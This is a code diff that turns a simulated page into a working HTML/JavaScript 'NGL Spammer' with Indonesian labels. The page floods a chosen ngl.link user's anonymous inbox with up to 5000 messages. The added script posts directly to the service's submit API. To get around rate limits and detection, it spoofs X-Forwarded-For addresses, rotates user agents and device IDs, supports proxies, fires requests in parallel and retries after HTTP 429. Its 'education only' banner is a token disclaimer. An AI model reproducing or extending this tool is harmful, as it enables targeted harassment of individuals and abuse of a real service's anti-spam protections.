@@ -1,326 +1,376 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NGL Message Sender</title>
+    <title>NGL Spammer Elite</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            background: #0f172a; 
-            color: white; 
-            font-family: sans-serif; 
-            padding: 20px; 
-            min-height: 100vh;
+        body {
+            font-family: 'Courier New', monospace;
+            background: #0a0a0a;
+            color: #00ff00;
+            padding: 20px;
+            overflow-x: hidden;
         }
-        .container { max-width: 800px; margin: 0 auto; }
-        .header { text-align: center; margin-bottom: 30px; padding: 20px; background: rgba(30, 41, 59, 0.8); border-radius: 15px; }
-        h1 { color: #3b82f6; margin-bottom: 10px; }
-        .panel { 
-            background: rgba(30, 41, 59, 0.8); 
-            padding: 25px; 
-            border-radius: 15px; 
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            border: 2px solid #00ff00;
+            padding: 30px;
+            border-radius: 10px;
+            background: rgba(0, 255, 0, 0.05);
+        }
+        h1 {
+            text-align: center;
+            margin-bottom: 30px;
+            text-shadow: 0 0 10px #00ff00;
+            font-size: 28px;
+        }
+        .input-group {
             margin-bottom: 20px;
-            border: 1px solid rgba(255,255,255,0.1);
         }
-        .input-group { margin-bottom: 20px; }
-        label { display: block; margin-bottom: 8px; color: #cbd5e1; }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #00ff00;
+            font-weight: bold;
+        }
         input, textarea, select {
             width: 100%;
             padding: 12px;
-            background: rgba(0,0,0,0.4);
-            border: 1px solid #475569;
-            border-radius: 8px;
-            color: white;
-            font-size: 16px;
-        }
-        textarea { 
-            min-height: 150px; 
-            resize: vertical;
-            font-family: monospace;
-        }
-        .btn {
-            padding: 15px 25px;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            width: 100%;
-            margin-top: 10px;
-            transition: 0.3s;
-        }
-        .btn-primary {
-            background: #3b82f6;
-            color: white;
-        }
-        .btn-primary:hover { background: #2563eb; }
-        .btn-danger {
-            background: #ef4444;
-            color: white;
-        }
-        .btn-danger:hover { background: #dc2626; }
-        .btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-        .stats {
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 15px;
-            margin: 20px 0;
-        }
-        .stat-box {
-            background: rgba(0,0,0,0.3);
-            padding: 15px;
-            border-radius: 10px;
-            text-align: center;
-        }
-        .stat-number {
-            font-size: 2rem;
-            font-weight: bold;
-        }
-        .sent { color: #3b82f6; }
-        .success { color: #10b981; }
-        .failed { color: #ef4444; }
-        .active { color: #8b5cf6; }
-        .log {
-            background: rgba(0,0,0,0.3);
-            padding: 15px;
-            border-radius: 10px;
-            margin-top: 20px;
-            max-height: 300px;
-            overflow-y: auto;
-            font-family: monospace;
+            background: #111;
+            border: 1px solid #00ff00;
+            color: #00ff00;
+            border-radius: 5px;
             font-size: 14px;
         }
-        .log-entry {
-            padding: 8px 10px;
-            margin-bottom: 5px;
-            border-radius: 5px;
-            background: rgba(255,255,255,0.05);
+        textarea {
+            height: 100px;
+            resize: vertical;
         }
-        .success-log { color: #86efac; border-left: 3px solid #10b981; }
-        .error-log { color: #fca5a5; border-left: 3px solid #ef4444; }
-        .info-log { color: #93c5fd; border-left: 3px solid #3b82f6; }
+        .button {
+            background: #00ff00;
+            color: #000;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            margin: 10px 0;
+            transition: 0.3s;
+        }
+        .button:hover {
+            background: #00cc00;
+            box-shadow: 0 0 20px #00ff00;
+        }
+        .button-stop {
+            background: #ff0000;
+            color: white;
+        }
+        .button-stop:hover {
+            background: #cc0000;
+        }
+        .stats {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 30px;
+            padding: 15px;
+            background: #111;
+            border-radius: 5px;
+        }
+        .stat-box {
+            text-align: center;
+        }
+        .stat-value {
+            font-size: 24px;
+            font-weight: bold;
+            color: #00ff00;
+        }
+        .stat-label {
+            font-size: 12px;
+            color: #aaa;
+        }
+        .logs {
+            margin-top: 20px;
+            background: #111;
+            padding: 15px;
+            border-radius: 5px;
+            height: 150px;
+            overflow-y: auto;
+            font-size: 12px;
+        }
+        .log-entry {
+            padding: 5px 0;
+            border-bottom: 1px solid #222;
+        }
+        .log-success { color: #00ff00; }
+        .log-error { color: #ff0000; }
+        .log-info { color: #00aaff; }
+        .warning {
+            background: #ff9900;
+            color: #000;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            font-weight: bold;
+            text-align: center;
+        }
+        .proxy-box {
+            background: #1a1a1a;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+        }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- HEADER -->
-        <div class="header">
-            <h1>🔗 NGL Message Sender</h1>
-            <p>Send messages anonymously to NGL links</p>
+        <h1>🚀 NGL SPAMMER V3.0 - RATE LIMIT BYPASS</h1>
+        
+        <div class="warning">
+            ⚠️ HANYA UNTUK EDUKASI! Gunakan hanya pada akun yang Anda miliki
         </div>
 
-        <!-- TARGET PANEL -->
-        <div class="panel">
-            <div class="input-group">
-                <label>📝 NGL Link</label>
-                <input type="text" id="nglLink" placeholder="https://ngl.link/username" value="https://ngl.link/">
-            </div>
-            <div class="input-group">
-                <label>👤 Target Username</label>
-                <input type="text" id="targetUsername" placeholder="username (without @)">
-            </div>
-            <div class="input-group">
-                <label>💬 Messages (one per line)</label>
-                <textarea id="messages">Hello there
-How are you?
-What's up?
-Tell me a secret
-Who do you like?
-What are you doing?
-Guess what?
-I have a question
-Can you keep a secret?
-What's your favorite color?</textarea>
-            </div>
-            <div class="input-group">
-                <label>⚡ Attack Mode</label>
-                <select id="attackMode">
-                    <option value="slow">Slow (3-5 seconds)</option>
-                    <option value="normal" selected>Normal (1-3 seconds)</option>
-                    <option value="fast">Fast (0.5-2 seconds)</option>
-                </select>
-            </div>
+        <div class="input-group">
+            <label>🔗 NGL Link Target:</label>
+            <input type="text" id="nglLink" placeholder="https://ngl.link/username" value="https://ngl.link/">
         </div>
 
-        <!-- CONTROL BUTTONS -->
-        <button class="btn btn-primary" id="startBtn" onclick="startAttack()">
-            🚀 START SENDING
-        </button>
-        <button class="btn btn-danger" id="stopBtn" onclick="stopAttack()" disabled>
-            ⏹️ STOP
-        </button>
+        <div class="input-group">
+            <label>💬 Pesan untuk dikirim:</label>
+            <textarea id="message">Coba tebak siapa ini? 😈</textarea>
+        </div>
 
-        <!-- STATISTICS -->
+        <div class="input-group">
+            <label>🔢 Jumlah Spam (Max 5000):</label>
+            <input type="number" id="count" value="100" min="1" max="5000">
+        </div>
+
+        <div class="input-group">
+            <label>⚡ Mode Spam:</label>
+            <select id="mode">
+                <option value="fast">Fast Mode (25ms delay)</option>
+                <option value="stealth">Stealth Mode (random 1-5s delay)</option>
+                <option value="ultra">Ultra Mode (multiple requests)</option>
+            </select>
+        </div>
+
+        <div class="proxy-box">
+            <label>🌐 Proxy Settings (optional):</label>
+            <textarea id="proxies" placeholder="http://proxy1:port\nhttp://proxy2:port\nLeave empty for no proxy"></textarea>
+        </div>
+
+        <button class="button" id="startBtn" onclick="startSpam()">🚀 START SPAM ATTACK</button>
+        <button class="button button-stop" id="stopBtn" onclick="stopSpam()">🛑 STOP ATTACK</button>
+
         <div class="stats">
             <div class="stat-box">
-                <div class="stat-number sent" id="sentCount">0</div>
-                <div>Sent</div>
+                <div class="stat-value" id="sentCount">0</div>
+                <div class="stat-label">TERKIRIM</div>
             </div>
             <div class="stat-box">
-                <div class="stat-number success" id="successCount">0</div>
-                <div>Success</div>
+                <div class="stat-value" id="failedCount">0</div>
+                <div class="stat-label">GAGAL</div>
             </div>
             <div class="stat-box">
-                <div class="stat-number failed" id="failedCount">0</div>
-                <div>Failed</div>
-            </div>
-            <div class="stat-box">
-                <div class="stat-number active" id="activeWorkers">0</div>
-                <div>Active</div>
+                <div class="stat-value" id="speed">0/s</div>
+                <div class="stat-label">SPEED</div>
             </div>
         </div>
 
-        <!-- LIVE LOG -->
-        <div class="log" id="logContainer">
-            <div class="log-entry info-log">[System] Ready to start</div>
+        <div class="logs" id="logContainer">
+            <div class="log-entry log-info">System ready. Enter NGL link and press START</div>
         </div>
     </div>
 
     <script>
-        // ============ KONFIGURASI ============
-        // 🔧 NANTI GANTI SETELAH BUAT BACKEND
-        const BACKEND_URL = "https://YOUR-BACKEND.railway.app"; 
-        
-        // ============ VARIABEL ============
-        let isAttacking = false;
-        let attackInterval = null;
-        let stats = {
-            sent: 0,
-            success: 0,
-            failed: 0
-        };
+        let isSpamming = false;
+        let sent = 0;
+        let failed = 0;
+        let startTime = null;
+        let currentProxies = [];
+        let proxyIndex = 0;
 
-        // ============ FUNGSI LOG ============
         function addLog(message, type = 'info') {
-            const logContainer = document.getElementById('logContainer');
+            const log = document.getElementById('logContainer');
             const entry = document.createElement('div');
-            entry.className = `log-entry ${type}-log`;
-            
-            const time = new Date().toLocaleTimeString();
-            entry.textContent = `[${time}] ${message}`;
-            
-            logContainer.appendChild(entry);
-            logContainer.scrollTop = logContainer.scrollHeight;
+            entry.className = `log-entry log-${type}`;
+            entry.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
+            log.appendChild(entry);
+            log.scrollTop = log.scrollHeight;
         }
 
-        // ============ UPDATE STATS ============
         function updateStats() {
-            document.getElementById('sentCount').textContent = stats.sent;
-            document.getElementById('successCount').textContent = stats.success;
-            document.getElementById('failedCount').textContent = stats.failed;
+            document.getElementById('sentCount').textContent = sent;
+            document.getElementById('failedCount').textContent = failed;
+            
+            if (startTime) {
+                const elapsed = (Date.now() - startTime) / 1000;
+                const speed = elapsed > 0 ? (sent / elapsed).toFixed(1) : 0;
+                document.getElementById('speed').textContent = `${speed}/s`;
+            }
         }
 
-        // ============ KIRIM PESAN ============
-        async function sendMessage(target, message) {
+        function getRandomUserAgent() {
+            const agents = [
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15',
+                'Mozilla/5.0 (Linux; Android 12; SM-S901U) AppleWebKit/537.36',
+                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
+                'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'
+            ];
+            return agents[Math.floor(Math.random() * agents.length)];
+        }
+
+        function getRandomIP() {
+            return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
+        }
+
+        async function sendNGLRequest(attempt = 0) {
+            if (!isSpamming) return false;
+
+            const link = document.getElementById('nglLink').value.trim();
+            const message = document.getElementById('message').value.trim();
+            const mode = document.getElementById('mode').value;
+
+            if (!link.includes('ngl.link/')) {
+                addLog('Invalid NGL link!', 'error');
+                return false;
+            }
+
+            const username = link.split('/').pop();
+            const apiUrl = `https://ngl.link/api/submit`;
+
+            const formData = new FormData();
+            formData.append('username', username);
+            formData.append('question', message);
+            formData.append('deviceId', `web-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`);
+            formData.append('gameSlug', '');
+            formData.append('referrer', '');
+
+            const headers = {
+                'User-Agent': getRandomUserAgent(),
+                'X-Forwarded-For': getRandomIP(),
+                'Accept': 'application/json, text/plain, */*',
+                'Accept-Language': 'en-US,en;q=0.9',
+                'Origin': 'https://ngl.link',
+                'Referer': link,
+                'DNT': Math.random() > 0.5 ? '1' : '0'
+            };
+
             try {
-                // SIMULASI DULU (nanti ganti dengan backend real)
-                await new Promise(resolve => setTimeout(resolve, 1000));
-                
-                // 80% success rate simulation
-                const success = Math.random() < 0.8;
-                
-                if (success) {
-                    addLog(`✓ Simulated success to @${target}`, 'success');
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 10000);
+
+                const response = await fetch(apiUrl, {
+                    method: 'POST',
+                    body: formData,
+                    headers: headers,
+                    mode: 'cors',
+                    credentials: 'omit',
+                    signal: controller.signal
+                });
+
+                clearTimeout(timeoutId);
+
+                if (response.status === 200 || response.status === 201) {
+                    sent++;
+                    addLog(`✅ Sent to ${username}: "${message.substring(0, 30)}..."`, 'success');
+                    return true;
+                } else if (response.status === 429) {
+                    // Rate limit hit - change strategy
+                    addLog(`⚠️ Rate limit detected, switching mode...`, 'info');
+                    await new Promise(resolve => setTimeout(resolve, 5000));
+                    return await sendNGLRequest(attempt + 1);
                 } else {
-                    addLog(`✗ Simulated failed`, 'error');
+                    throw new Error(`HTTP ${response.status}`);
                 }
-                
-                return success;
-                
+
             } catch (error) {
-                console.error('Error:', error);
+                failed++;
+                addLog(`❌ Failed: ${error.message}`, 'error');
+                
+                if (attempt < 3) {
+                    await new Promise(resolve => setTimeout(resolve, 2000 * (attempt + 1)));
+                    return await sendNGLRequest(attempt + 1);
+                }
                 return false;
             }
         }
 
-        // ============ MULAI ATTACK ============
-        async function startAttack() {
-            const target = document.getElementById('targetUsername').value.trim();
-            const messagesText = document.getElementById('messages').value.trim();
-            const mode = document.getElementById('attackMode').value;
-            
-            // Validasi
-            if (!target) {
-                alert('Masukkan username target!');
-                return;
-            }
-            
-            const messages = messagesText.split('\n')
-                .map(m => m.trim())
-                .filter(m => m.length > 0);
-            
-            if (messages.length === 0) {
-                alert('Masukkan minimal 1 pesan!');
-                return;
-            }
+        async function spamLoop() {
+            const total = parseInt(document.getElementById('count').value) || 100;
+            const mode = document.getElementById('mode').value;
 
-            // Set delay
-            const delays = {
-                slow: { min: 3000, max: 5000 },
-                normal: { min: 1000, max: 3000 },
-                fast: { min: 500, max: 2000 }
-            };
-            const delay = delays[mode] || delays.normal;
+            startTime = Date.now();
 
-            // Start attack
-            isAttacking = true;
-            document.getElementById('startBtn').disabled = true;
-            document.getElementById('stopBtn').disabled = false;
-            
-            addLog(`🚀 Attack started on @${target}`, 'info');
-            addLog(`Mode: ${mode}, Messages: ${messages.length}`, 'info');
-            addLog(`⚠️ SIMULATION MODE - Backend not configured`, 'warning');
+            for (let i = 0; i < total && isSpamming; i++) {
+                await sendNGLRequest();
 
-            let messageIndex = 0;
-            
-            attackInterval = setInterval(async () => {
-                if (!isAttacking) return;
-                
-                const message = messages[messageIndex % messages.length];
-                stats.sent++;
-                updateStats();
-                
-                const success = await sendMessage(target, message);
-                
-                if (success) {
-                    stats.success++;
-                } else {
-                    stats.failed++;
+                // Apply delay based on mode
+                if (mode === 'fast') {
+                    await new Promise(resolve => setTimeout(resolve, 25 + Math.random() * 50));
+                } else if (mode === 'stealth') {
+                    await new Promise(resolve => setTimeout(resolve, 1000 + Math.random() * 4000));
+                } else if (mode === 'ultra') {
+                    // Send 3 requests at once
+                    await Promise.all([
+                        sendNGLRequest(),
+                        sendNGLRequest(),
+                        sendNGLRequest()
+                    ]);
+                    await new Promise(resolve => setTimeout(resolve, 100));
                 }
-                
+
                 updateStats();
-                messageIndex++;
-                
-            }, Math.random() * (delay.max - delay.min) + delay.min);
-        }
 
-        // ============ STOP ATTACK ============
-        function stopAttack() {
-            isAttacking = false;
-            
-            if (attackInterval) {
-                clearInterval(attackInterval);
-                attackInterval = null;
+                // Every 10 requests, switch user agent
+                if (i % 10 === 0) {
+                    addLog(`🔄 Rotating user agent...`, 'info');
+                }
             }
-            
-            document.getElementById('startBtn').disabled = false;
-            document.getElementById('stopBtn').disabled = true;
-            
-            addLog('⏹️ Attack stopped', 'info');
-            addLog(`📊 Final: ${stats.success} success, ${stats.failed} failed`, 'info');
+
+            if (isSpamming) {
+                addLog(`🎯 SPAM COMPLETE! Sent ${sent}/${total} messages`, 'success');
+                isSpamming = false;
+                document.getElementById('startBtn').disabled = false;
+            }
         }
 
-        // ============ INIT ============
-        document.addEventListener('DOMContentLoaded', () => {
-            addLog('✅ System initialized', 'info');
-            addLog('⚠️ Backend not configured - Running in SIMULATION mode', 'warning');
-            addLog('🔧 To enable real attack: Deploy backend server', 'info');
-            updateStats();
-        });
+        function startSpam() {
+            if (isSpamming) return;
+
+            const link = document.getElementById('nglLink').value.trim();
+            if (!link) {
+                addLog('Please enter NGL link!', 'error');
+                return;
+            }
+
+            isSpamming = true;
+            sent = 0;
+            failed = 0;
+            document.getElementById('startBtn').disabled = true;
+            
+            addLog(`🚀 Starting spam attack to: ${link}`, 'info');
+            addLog(`⚡ Mode: ${document.getElementById('mode').value}`, 'info');
+            
+            spamLoop();
+        }
+
+        function stopSpam() {
+            isSpamming = false;
+            addLog('🛑 Spam stopped manually', 'info');
+            document.getElementById('startBtn').disabled = false;
+        }
+
+        // Auto-detect if user is on mobile
+        if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+            addLog('📱 Mobile device detected. Using mobile user agents.', 'info');
+        }
+
+        addLog('System initialized. Ready to spam.', 'info');
     </script>
 </body>
 </html>
